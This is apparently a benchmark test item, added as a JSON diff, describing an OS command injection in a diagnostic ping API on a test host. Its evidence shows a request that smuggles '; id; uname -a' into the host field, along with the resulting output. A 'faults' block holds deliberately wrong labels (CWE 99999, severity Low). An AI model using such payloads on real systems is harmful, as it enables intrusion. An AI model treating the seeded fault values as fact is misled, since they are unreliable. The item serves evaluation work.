@@ -1,0 +1,31 @@
+{
+  "id": "command-injection-ping",
+  "split": "dev",
+  "title": "OS command injection in diagnostic ping tool",
+  "asset": "https://shop.acme.test/api/tools/ping",
+  "notes": "Command injection vulnerability in POST /api/tools/ping. Authenticated user can append shell operators like ; id to execute arbitrary commands as www-data on the web server.",
+  "evidence": [
+    {
+      "name": "rce-ping.png",
+      "file": "assets/rce-ping.png",
+      "text": "POST /api/tools/ping HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"host\":\"127.0.0.1; id; uname -a\"}\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux shop-prod 5.15.0-generic #1 SMP x86_64 GNU/Linux"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "cwe": [
+      "78"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 8.8,
+    "severity": "High"
+  },
+  "faults": {
+    "cwe": "99999",
+    "severity_text": "Low",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
